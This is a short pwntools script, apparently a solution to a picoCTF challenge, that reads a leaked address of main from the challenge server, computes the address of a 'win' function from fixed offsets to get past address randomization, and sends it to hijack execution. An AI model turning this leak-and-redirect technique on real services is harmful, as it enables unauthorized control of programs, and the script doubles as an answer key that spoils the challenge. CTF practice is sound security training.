from pwn import *
import re

context.log_level = 'info'

HOST = "rescued-float.picoctf.net"
PORT = 58266 
r = remote(HOST, PORT)

response = r.recvline().decode()
info(f"Received: {response}")

match = re.search(r'0x[0-9a-fA-F]+', response)
if match:
    main_addr = int(match.group(0), 16)
    info(f"Main address: {hex(main_addr)}")

    new_addr = main_addr - 0x133d + 0x12a7
    info(f"Win address: {hex(new_addr)}")

    r.sendline(hex(new_addr).encode())

    info(r.recvall().decode())
else:
    info("Failed to extract the address.")

r.close()
